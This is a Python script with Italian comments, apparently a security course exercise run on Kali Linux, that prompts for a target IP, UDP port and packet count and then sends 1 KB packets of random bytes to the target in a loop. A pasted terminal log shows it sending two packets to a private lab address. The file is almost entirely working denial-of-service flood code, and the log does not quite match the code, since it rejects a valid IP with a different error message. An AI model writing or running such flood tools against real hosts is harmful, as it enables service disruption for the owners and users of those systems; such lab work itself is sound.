import socket             # per la comunicazione di rete (sockets UDP)
import random             # per generare dati casuali (payload)
import ipaddress          # per validare indirizzi IP (IPv4 o IPv6)
import sys                # per uscire pulitamente in caso di errore

def get_valid_ip():

    ## Richiede ripetutamente un indirizzo IP all'utente.
    ## Usa ipaddress.ip_address() per verificare se è un IPv4 o valido.
    ## In caso di input non valido, stampa un messaggio di errore e chiede di nuovo.

    while True:
        ip_input = input("Inserisci l'IP della macchina target: ")
        try:
            ipaddress.ip_address(ip_input)
            return ip_input
        except ValueError:
            print("❌ IP non valido. Riprova con un formato IPv4 corretto.")

def get_valid_port():

    ## Richiede un numero di porta UDP compreso tra 1 e 65535.
    ## Se l'input non è un numero o è fuori range, stampa errore e ripete.
    while True:
        try:
            port_input = int(input("Inserisci la porta UDP target (1–65535): "))
            if 1 <= port_input <= 65535:
                return port_input
            else:
                print("❌ Dev'essere un numero tra 1 e 65535.")
        except ValueError:
            print("❌ Inserisci un numero intero valido.")

def get_valid_packet_count():

    ## Richiede quanti pacchetti da 1 KB inviare.
    ## Deve essere un intero positivo (> 0).
    while True:
        try:
            count = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))
            if count > 0:
                return count
            else:
                print("❌ Il numero deve essere maggiore di 0.")
        except ValueError:
            print("❌ Inserisci un numero intero valido.")

def main():
    print("=== Simulazione UDP Flood ===")

    target_ip = get_valid_ip()
    target_port = get_valid_port()
    num_packets = get_valid_packet_count()

    # Prepara un pacchetto da esattamente 1024 byte (1 KB)
    # È una sequenza di byte casuali: utile per simulare traffico UDP non trivial.
    packet_data = random._urandom(1024)

    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as err:
        print(f"❌ Errore creazione socket UDP: {err}")
        sys.exit(1)

    try:
        for i in range(num_packets):
            udp_socket.sendto(packet_data, (target_ip, target_port))
            print(f"[{i + 1}/{num_packets}] Inviato 1 KB a {target_ip}:{target_port}")
    except KeyboardInterrupt:
        print("\n❗ Invio interrotto dall'utente.")
    except Exception as exc:
        print(f"❌ Errore durante l'invio: {exc}")
    finally:
        udp_socket.close()
        print("✅ Simulazione UDP Flood terminata.")

if __name__ == "__main__":
    main()

##/bin/python /home/kali/Desktop/Unit-2/esercizioS6L3./esercizio.py
##──(kali㉿kali)-[~/Desktop/Unit-2]
#$ /bin/python /home/kali/Desktop/Unit-2/esercizioS6L3./esercizio.py
#=== Simulazione UDP Flood ===
#Inserisci l'IP della macchina target: 192.168.56.103
#❌ IP non valido. Riprova con un formato IPv4 o IPv6 corretto.
#Inserisci l'IP della macchina target: 192.168.50.100
#Inserisci la porta UDP target (1–65535): 80
#Quanti pacchetti da 1 KB vuoi inviare? 2
#[1/2] Inviato 1 KB a 192.168.50.100:80
#[2/2] Inviato 1 KB a 192.168.50.100:80
#✅ Simulazione UDP Flood terminata.
